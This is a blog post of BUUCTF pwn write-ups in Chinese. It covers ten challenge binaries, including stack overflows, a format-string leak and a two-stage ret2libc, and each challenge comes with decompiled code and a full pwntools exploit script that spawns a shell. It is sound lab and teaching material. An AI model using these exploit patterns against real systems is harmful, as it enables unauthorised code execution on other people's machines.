---
title: "Write-ups: BUUCTF"
published: 2025-07-05
updated: 2025-07-09
description: "Write-ups for BUUCTF's pwn aspect."
image: "./covers/buuctf.png"
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# rip

## Information

- Category: Pwn
- Points: 1

## Write-up

丢给 IDA 老婆分析，看到有一个危险函数 `gets`，还有一个 `fun` 会返回 `system("/bin/sh")`，保护全关。直接打，注意栈对齐。

## Exploit

```python
#!/usr/bin/python

from pwn import ROP, args, context, flat, gdb, process, remote

gdbscript = """
b *main+32
b *main+67
c
"""

FILE = "./pwn1"
HOST, PORT = "node5.buuoj.cn", 27889

context(log_level="debug", binary=FILE, terminal="kitty")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def construct_payload():
    elf = context.binary
    rop = ROP(elf)

    payload = flat(b"A" * 0x17, rop.ret.address, elf.symbols["fun"])

    return payload


def main():
    target = launch()
    payload = construct_payload()

    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{840e6d55-5582-4995-a345-79f37e63db00}`

# warmup_csaw_2016

## Information

- Category: Pwn
- Points: 1

## Write-up

`int sprintf(char* buffer, const char* format, ...);` 函数将格式化后的数据写入缓冲区，返回值是写入的字符数，不包括末尾的空字符 `\0`。`snprintf` 加入了缓冲区大小检查以及自动截断，比 `sprintf` 更安全，虽然本题没考这个函数的安全性问题。

这里 `vuln` 的地址将被写入 buffer `s`，然后 `write` 负责将 buffer `s` 中前九个字节，也就是 `vuln` 的地址输出到标准输出。

`main` 返回的是 `gets`，我们通过这个 `gets` 覆盖返回地址，修改为白送的 `vuln` 的地址即可。

```c del={11}
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char s[64]; // [rsp+0h] [rbp-80h] BYREF
  _BYTE v5[64]; // [rsp+40h] [rbp-40h] BYREF

  write(1, "-Warm Up-\n", 0xAuLL);
  write(1, "WOW:", 4uLL);
  sprintf(s, "%p\n", vuln);
  write(1, s, 9uLL);
  write(1, ">", 1uLL);
  return gets(v5);
}
```

```c
int vuln()
{
  return system("cat flag.txt");
}
```

## Exploit

```python
#!/usr/bin/python

from pwn import args, context, flat, gdb, process, remote

gdbscript = """
b *main+70
b *main+129
c
"""

FILE = "./pwn-patched"
HOST, PORT = "node5.buuoj.cn", 26553

context(log_level="debug", binary=FILE, terminal="kitty")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def construct_payload(leaked_addr):
    payload = flat(b"A" * 0x48, leaked_addr)

    return payload


def main():
    target = launch()

    target.recvuntil(b"WOW:")
    leaked_addr = int(target.recvline().strip(), 16)

    payload = construct_payload(leaked_addr)

    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{25bcbfc0-3b7e-4261-b957-297bf39c1bfd}`

# ciscn_2019_n_1

## Information

- Category: Pwn
- Points: 1

## Write-up

通过 `gets` 将 `v2` 篡改为 `11.28125` 即可。

```c ins={9-10} del={8}
int func()
{
  _BYTE v1[44]; // [rsp+0h] [rbp-30h] BYREF
  float v2; // [rsp+2Ch] [rbp-4h]

  v2 = 0.0;
  puts("Let's guess the number.");
  gets(v1);
  if ( v2 == 11.28125 )
    return system("cat /flag");
  else
    return puts("Its value should be 11.28125");
}
```

第一次接触小数的处理问题，调试的时候，可以使用 `p/f $xmm0` 来查看这个寄存器的值，同理，使用 `p` 指令加上强制转换和解引用，可以检查地址处保存的小数值：

```asm wrap=false showLineNumbers=false
pwndbg> p/f $xmm0
$1 = {
  v8_bfloat16 = {-0, 11.25, 0, 0, 0, 0, 0, 0},
  v8_half = {-0, 2.6016, 0, 0, 0, 0, 0, 0},
  v4_float = {11.28125, 0, 0, 0},
  v2_double = {5.404878958234834e-315, 0},
  v16_int8 = {0, -128, 52, 65, 0 <repeats 12 times>},
  v8_int16 = {-0, 2.6016, 0, 0, 0, 0, 0, 0},
  v4_int32 = {11.28125, 0, 0, 0},
  v2_int64 = {5.404878958234834e-315, 0},
  uint128 = 3.98770131343430171379e-4942
}
pwndbg> p/f $xmm0.v4_int32[0]
$2 = 11.28125
pwndbg> p *(float *)($rbp - 4)
$3 = 11.28125
```

## Exploit

```python
#!/usr/bin/python

from pwn import args, context, flat, gdb, process, remote, struct

gdbscript = """
b *func+58
c
"""

FILE = "./ciscn_2019_n_1"
HOST, PORT = "node5.buuoj.cn", 25637

context(log_level="debug", binary=FILE, terminal="kitty")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def construct_payload():
    payload = flat(b"A" * 0x2C, struct.pack("<f", 11.28125))

    return payload


def main():
    target = launch()

    payload = construct_payload()

    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{7fd050d8-bfa7-44bc-b98b-a4ee709fea28}`

# pwn1_sctf_2016

## Information

- Category: Pwn
- Points: 1

## Write-up

```c ins={12} del={18, 25-26}
int vuln()
{
  const char *v0; // eax
  int v2; // [esp+8h] [ebp-50h]
  char s[32]; // [esp+1Ch] [ebp-3Ch] BYREF
  _BYTE v4[4]; // [esp+3Ch] [ebp-1Ch] BYREF
  _BYTE v5[7]; // [esp+40h] [ebp-18h] BYREF
  char v6; // [esp+47h] [ebp-11h] BYREF
  _BYTE v7[7]; // [esp+48h] [ebp-10h] BYREF
  _BYTE v8[5]; // [esp+4Fh] [ebp-9h] BYREF

  printf("Tell me something about yourself: ");
  fgets(s, 32, edata);
  std::string::operator=(&input, s);
  std::allocator<char>::allocator(&v6);
  std::string::string(v5, "you", &v6);
  std::allocator<char>::allocator(v8);
  std::string::string(v7, "I", v8);
  replace((std::string *)v4, (std::string *)&input, (std::string *)v7);
  std::string::operator=(&input, v4, v2, v5);
  std::string::~string(v4);
  std::string::~string(v7);
  std::allocator<char>::~allocator(v8);
  std::string::~string(v5);
  std::allocator<char>::~allocator(&v6);
  v0 = (const char *)std::string::c_str((std::string *)&input);
  strcpy(s, v0);
  return printf("So, %s\n", s);
}
```

从上面代码可知，`fegts` 读取了 32 个字符到 buffer `s`，其中 `\0` 占了一个位置，所以我们可以输入的有 31 个字符。

接着，`replace` 会将 buffer `s` 中的字符 `I` 替换为 `you`，返回修改后的字符串，赋给 `input`；`v0` 是 `input.c_str()` 的结果，其中 `c_str()` 的功能是 `Returns a pointer to a null-terminated character array with data equivalent to those stored in the string.` 这个结果被 `strcpy` 复制到 buffer `s`，由于 `strcpy` 不会检查 buffer 大小，所以可能造成溢出，溢出后我们篡改返回地址返回到后门函数 `get_flag` 即可。

这个 `replace` 函数怎么说呢……反正我是没自己读反编译的代码，没学过 `C++`，看着头好大……我做这题的时候刚开始是看见 `vuln` 中有涉及 `replace` 的字眼，就觉得可能会对字符串做一些替换修改的操作吧。接着看到代码中出现的 `you`，`I` 这样的字符串常量，直接运行程序拿这些内容去试试，发现输入 `I` 会被替换成 `you`，那 `replace` 的作用不用看也猜得差不多了。最后，闲的没事，我让 GPT 分析了一下 `replace` 的功能，和猜的也差不多。太菜了呜呜呜……

```cpp collapse={4-45}
std::string *__stdcall replace(std::string *a1, std::string *a2, std::string *a3)
{
  int v4; // [esp+Ch] [ebp-4Ch]
  _BYTE v5[4]; // [esp+10h] [ebp-48h] BYREF
  _BYTE v6[7]; // [esp+14h] [ebp-44h] BYREF
  char v7; // [esp+1Bh] [ebp-3Dh] BYREF
  int v8; // [esp+1Ch] [ebp-3Ch]
  _BYTE v9[4]; // [esp+20h] [ebp-38h] BYREF
  int v10; // [esp+24h] [ebp-34h] BYREF
  int v11; // [esp+28h] [ebp-30h] BYREF
  char v12; // [esp+2Fh] [ebp-29h] BYREF
  _DWORD v13[2]; // [esp+30h] [ebp-28h] BYREF
  _BYTE v14[4]; // [esp+38h] [ebp-20h] BYREF
  int v15; // [esp+3Ch] [ebp-1Ch]
  _BYTE v16[4]; // [esp+40h] [ebp-18h] BYREF
  int v17; // [esp+44h] [ebp-14h] BYREF
  _BYTE v18[4]; // [esp+48h] [ebp-10h] BYREF
  _BYTE v19[8]; // [esp+4Ch] [ebp-Ch] BYREF

  while ( std::string::find(a2, a3, 0) != -1 )
  {
    std::allocator<char>::allocator(&v7);
    v8 = std::string::find(a2, a3, 0);
    std::string::begin((std::string *)v9);
    __gnu_cxx::__normal_iterator<char *,std::string>::operator+(&v10);
    std::string::begin((std::string *)&v11);
    std::string::string<__gnu_cxx::__normal_iterator<char *,std::string>>(v6, v11, v10, &v7);
    std::allocator<char>::~allocator(&v7);
    std::allocator<char>::allocator(&v12);
    std::string::end((std::string *)v13);
    v13[1] = std::string::length(a3);
    v15 = std::string::find(a2, a3, 0);
    std::string::begin((std::string *)v16);
    __gnu_cxx::__normal_iterator<char *,std::string>::operator+(v14);
    __gnu_cxx::__normal_iterator<char *,std::string>::operator+(&v17);
    std::string::string<__gnu_cxx::__normal_iterator<char *,std::string>>(v5, v17, v13[0], &v12);
    std::allocator<char>::~allocator(&v12);
    std::operator+<char>((std::string *)v19);
    std::operator+<char>((std::string *)v18);
    std::string::operator=(a2, v18, v5, v4);
    std::string::~string(v18);
    std::string::~string(v19);
    std::string::~string(v5);
    std::string::~string(v6);
  }
  std::string::string(a1, a2);
  return a1;
}
```

## Exploit

```python
#!/usr/bin/python

from pwn import args, context, flat, gdb, process, remote

gdbscript = """
b *vuln+42
c
"""

FILE = "./pwn1_sctf_2016"
HOST, PORT = "node5.buuoj.cn", 28688

context(log_level="debug", binary=FILE, terminal="kitty")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def construct_payload():
    elf = context.binary

    payload = flat(b"I" * 21 + b"A", elf.symbols["get_flag"])

    return payload


def main():
    target = launch()

    payload = construct_payload()

    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{db1e1ee0-907b-497b-85eb-9fe936bf26e7}`

# jarvisoj_level0

## Information

- Category: Pwn
- Points: 1

## Write-up

闹着玩呢？不写了，和第一题差不多。

## Exploit

```python
#!/usr/bin/python

from pwn import ROP, args, context, flat, gdb, process, remote

gdbscript = """
c
"""

FILE = "./level0"
HOST, PORT = "node5.buuoj.cn", 27572

context(log_level="debug", binary=FILE, terminal="kitty")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def construct_payload():
    elf = context.binary
    rop = ROP(elf)

    payload = flat(b"A" * 0x88, rop.ret.address, elf.symbols["callsystem"])

    return payload


def main():
    target = launch()

    payload = construct_payload()

    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{05ce7df6-bb73-4445-9abd-b107d55cede1}`

# [第五空间 2019 决赛] PWN5

## Information

- Category: Pwn
- Points: 1

## Write-up

```c del={19, 21} ins={23-28}
int __cdecl main(int a1)
{
  time_t v1; // eax
  int result; // eax
  int fd; // [esp+0h] [ebp-84h]
  char nptr[16]; // [esp+4h] [ebp-80h] BYREF
  char buf[100]; // [esp+14h] [ebp-70h] BYREF
  unsigned int v6; // [esp+78h] [ebp-Ch]
  int *v7; // [esp+7Ch] [ebp-8h]

  v7 = &a1;
  v6 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  v1 = time(0);
  srand(v1);
  fd = open("/dev/urandom", 0);
  read(fd, &dword_804C044, 4u);
  printf("your name:");
  read(0, buf, 0x63u);
  printf("Hello,");
  printf(buf);
  printf("your passwd:");
  read(0, nptr, 0xFu);
  if ( atoi(nptr) == dword_804C044 )
  {
    puts("ok!!");
    system("/bin/sh");
  }
  else
  {
    puts("fail");
  }
  result = 0;
  if ( __readgsdword(0x14u) != v6 )
    sub_80493D0();
  return result;
}
```

核心逻辑是判断 `atoi(nptr) == dword_804C044`，因此只要我们需要知道 `dword_804C044` 的值，就可以拿到 `shell`。

这题完全就是考了个格式化字符串漏洞，`read(fd, &dword_804C044, 4u);` 将随机数读取到 `bss` 段，所以我们只要想办法泄漏 `bss` 中保存的 `dword_804C044` 的值就好了。`dword_804C044` 的地址可以通过 `bss` 段基地址加上 debug 出来的数据偏移计算得到。把泄漏的地址和格式化字符串一起作为输入发送，用 `%s` 来输出栈上保存的地址所指向的值。

## Exploit

```python
#!/usr/bin/python

from pwn import args, context, flat, gdb, process, remote, u32

gdbscript = """
b *0x80492bc
b *0x80492f0
c
"""

FILE = "./pwn"
HOST, PORT = "node5.buuoj.cn", 26163

context(log_level="debug", binary=FILE, terminal="kitty")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def rev_atoi(data):
    return str(u32(data)).encode()


def construct_payload():
    elf = context.binary

    payload = flat(b"aa%12$s\x00", elf.bss() + 0x4)

    return payload


def main():
    target = launch()

    payload = construct_payload()

    target.sendlineafter(b"your name:", payload)
    target.recvuntil(b"aa")

    passwd = rev_atoi(target.recv(0x4))

    target.sendlineafter(b"your passwd:", passwd)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{a375d1c7-b6dc-4b93-bb5e-9ba59d14060a}`

# jarvisoj_level2

## Information

- Category: Pwn
- Points: 1

## Write-up

```c del={6}
ssize_t vulnerable_function()
{
  _BYTE buf[136]; // [esp+0h] [ebp-88h] BYREF

  system("echo Input:");
  return read(0, buf, 256u);
}
```

观察上面程序，`read` 可以溢出破坏返回地址。由于这是 32-bit 程序，函数参数通过栈来传递，所以我们可以覆盖返回地址为 `system@plt`，然后在栈上写传给 `system` 的参数。

我们希望拿 `shell`，直接 IDA `Shift + F12` 看程序包含的字符串，发现有 `.data:0804A024 hint db '/bin/sh',0`，那么参数问题就解决了，因为没开 PIE，直接就是固定地址。

需要注意的是，如果你返回到 `call system@plt` 这样的内部指令，由于 `call` 指令会自动将下一条指令的地址压入栈中，作为函数调用结束后的返回地址，所以你可以直接在它之后写要传入的参数；而如果选择返回到 `system@plt`，那就需要手动提供一个地址作为函数调用结束后的返回地址，之后才是跟着函数的参数。

即，`call` 指令可以分解为 `push eip_next; jmp <entry>`，而返回到 `system@plt` 相当于直接 `jmp system@plt`，没有设置返回地址。

## Exploit

```python
#!/usr/bin/python

from pwn import args, context, flat, gdb, process, remote

gdbscript = """
set follow-fork-mode parent
b *vulnerable_function+42
b *vulnerable_function+52
c
"""

FILE = "./level2"
HOST, PORT = "node5.buuoj.cn", 25976

context(log_level="debug", binary=FILE, terminal="kitty")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def construct_payload():
    elf = context.binary

    payload = flat(
        b"A" * 0x8C,
        elf.plt["system"],
        0x0,  # return address placeholder
        next(elf.search(b"/bin/sh")),
    )

    return payload


def main():
    target = launch()

    payload = construct_payload()

    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{b3e65f27-e5ed-4763-a83b-d582ac37b3ea}`

# ciscn_2019_n_8

## Information

- Category: Pwn
- Points: 1

## Write-up

```c ins={11-14} del={10} collapse={18-40}
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-14h] [ebp-20h]
  int v5; // [esp-10h] [ebp-1Ch]

  var[13] = 0;
  var[14] = 0;
  init();
  puts("What's your name?");
  __isoc99_scanf("%s", var, v4, v5);
  if ( *(_QWORD *)&var[13] )
  {
    if ( *(_QWORD *)&var[13] == 17LL )
      system("/bin/sh");
    else
      printf(
        "something wrong! val is %d",
        var[0],
        var[1],
        var[2],
        var[3],
        var[4],
        var[5],
        var[6],
        var[7],
        var[8],
        var[9],
        var[10],
        var[11],
        var[12],
        var[13],
        var[14]);
  }
  else
  {
    printf("%s, Welcome!\n", var);
    puts("Try do something~");
  }
  return 0;
}
```

`__isoc99_scanf((int)"%s", (int)var, v4, v5);` 存在栈溢出漏洞，因为没有限制 `%s` 可以读取的字符数。这里 IDA 反编译出来多了两个无关的参数 `v4` 和 `v5`，直接忽视就好了。后面两个条件判断，第一个 `*(_QWORD *)&var[13]` 是将 `&var[13]` 处的八字节，解释成一个整数，看它的值是否为 `0`，不为零则进入下一个判断；`*(_QWORD *)&var[13] == 0x11LL`，看 `&var[13]` 这个地址处的八字节整数是否为 `0x11`，成立则 `getshell`。

## Exploit

```python
#!/usr/bin/python

from pwn import args, context, flat, gdb, p64, process, remote

gdbscript = """
b *main+100
b *main+105
c
"""

FILE = "./ciscn_2019_n_8"
HOST, PORT = "node5.buuoj.cn", 29741

context(log_level="debug", binary=FILE, terminal="kitty")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def construct_payload():
    payload = flat(b"A" * 52, p64(0x11))

    return payload


def main():
    target = launch()

    payload = construct_payload()

    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{e913a0b0-686a-4aec-a25e-503e2dc2d226}`

# bjdctf_2020_babystack

## Information

- Category: Pwn
- Points: 1

## Write-up

```c del={16,18}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[12]; // [rsp+0h] [rbp-10h] BYREF
  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);
  puts("[+]What's u name?");
  read(0, buf, (unsigned int)nbytes);
  return 0;
}
```

`read` 读取多少字符是通过 `__isoc99_scanf` 控制的。

## Exploit

```python
#!/usr/bin/python

from pwn import ROP, args, context, flat, gdb, process, remote

gdbscript = """
b *main+197
b *main+208
c
"""

FILE = "./bjdctf_2020_babystack"
HOST, PORT = "node5.buuoj.cn", 29741

context(log_level="debug", binary=FILE, terminal="kitty")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def construct_payload():
    elf = context.binary
    rop = ROP(elf)

    payload = flat(b"A" * 0x18, rop.ret.address, elf.symbols["backdoor"])

    return payload


def main():
    target = launch()

    payload = construct_payload()

    target.sendlineafter(b"your name:", b"1337")
    target.sendlineafter(b"What's u name?", payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{3e70b773-5928-4c8e-9520-b5c5fc9d2fff}`

# ciscn_2019_c_1

## Information

- Category: Pwn
- Points: 1

## Write-up

程序的 `main` 函数里没什么有用的信息，重点看下面的 `encrypt` 函数。

```c del={10,35}
int encrypt()
{
  size_t v0; // rbx
  char s[48]; // [rsp+0h] [rbp-50h] BYREF
  __int16 v3; // [rsp+30h] [rbp-20h]

  memset(s, 0, sizeof(s));
  v3 = 0;
  puts("Input your Plaintext to be encrypted");
  gets(s);
  while ( 1 )
  {
    v0 = (unsigned int)x;
    if ( v0 >= strlen(s) )
      break;
    if ( s[x] <= 96 || s[x] > 122 )
    {
      if ( s[x] <= 64 || s[x] > 90 )
      {
        if ( s[x] > 47 && s[x] <= 57 )
          s[x] ^= 0xFu;
      }
      else
      {
        s[x] ^= 0xEu;
      }
    }
    else
    {
      s[x] ^= 0xDu;
    }
    ++x;
  }
  puts("Ciphertext");
  return puts(s);
}
```

基本就是把输入字符串经过一些 `xor` 运算，得到密文。注意到获取输入使用的是 `gets`，所以我们可以覆盖返回地址。程序没有包含任何后门函数，所以我们可以打 shellcode 或者 ROP，但是程序开了 NX，而且 ropper 也没有给出什么 syscall 之类的构造 ROP 链的 gadgets，那就打 ret2plt 泄漏 libc 地址，再打 ret2libc getshell.

不过我们的 payload 经过 `encrypt` 的加密会被破坏，所以一个想法是想办法让我们的输入经过 `encrypt` 的加密出来得到的是 payload 本身，另一种想法是想办法绕过加密逻辑。前者比较麻烦，我们优先思考后者。发现执行加密逻辑前有个判断，如果满足 `if ( v0 >= strlen(s) )` 就不会执行加密逻辑。字符串长度是通过 `strlen` 获取的，这个函数判断字符串结束的方法是检测 `\x00` 字符，所以如果我们把 `\x00` 放在 payload 开头，这个判断就会认为我们的字符串长度为 0，不去执行下面的加密逻辑，成功绕过。

因为 `encrypt` 是返回到 `puts(s)`，由于在此之前我们已经执行过 `puts` 了，所以 got 表中一定有它在 libc 中的真实地址。所以我们可以通过 `puts` 泄漏 `puts@got` 中保存的真实地址，然后算出 libc 基地址，再用 libc 中的 `system` 和 `/bin/sh` 字符串构造 getshell 的 ROP 链。

由于我们返回到 `puts` 泄漏完地址后程序就结束了，所以我们在第一阶段泄漏出地址后需要让程序返回到 `main`，重新运行主菜单逻辑（只要程序没有 exit，就不会改变 libc 基址），之后再把第二阶段的 ROP 链发出去。

由于题目没给 libc，所以远程需要用 `LibcSearcher` 来打。本地打的时候直接用系统的 libc，等本地通了再改成 `LibcSearcher` 去打远端，直接用 `LibcSearcher` 打不通本地，可能因为 libc-database 更新不及时，没有我们本地的 libc 版本。

## Exploit

```python
#!/usr/bin/python

from pwn import ROP, args, context, flat, gdb, log, process, remote, u64

from LibcSearcher.LibcSearcher import LibcSearcher

gdbscript = """
# b *encrypt+61
# b *encrypt+322
# b *encrypt+334
c
"""

FILE = "./ciscn_2019_c_1"
HOST, PORT = "node5.buuoj.cn", 28304

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def to_hex_bytes(data):
    return "".join(f"\\x{byte:02x}" for byte in data)


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def construct_payload(stage, libc, libc_base):
    rop = ROP(elf)

    if stage == 1:
        return flat(
            b"\x00",
            b"A" * 0x57,
            rop.rdi.address,
            elf.got["puts"],
            elf.plt["puts"],
            elf.symbols["main"],
        )
    elif stage == 2:
        return flat(
            b"\x00",
            b"A" * 0x57,
            rop.rdi.address,
            libc_base + libc.dump("str_bin_sh"),
            rop.ret.address,
            libc_base + libc.dump("system"),
            0x0,
        )
    else:
        log.error(b"Failed constructing payload!")


def main():
    target = launch()

    payload = construct_payload(1, None, None)

    target.sendlineafter(b"Input your choice!", b"1")
    target.sendline(payload)
    target.recvuntil(b"Ciphertext")

    leaked_puts = u64(target.recv(0x8).strip().ljust(8, b"\x00"))
    libc = LibcSearcher("puts", leaked_puts)
    libc_base = leaked_puts - libc.dump("puts")

    log.success(f"libc base: {hex(libc_base)}")

    payload = construct_payload(2, libc, libc_base)

    target.sendlineafter(b"Input your choice!", b"1")
    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{02f14642-e0fe-43ec-9eb9-0acbb7691cae}`
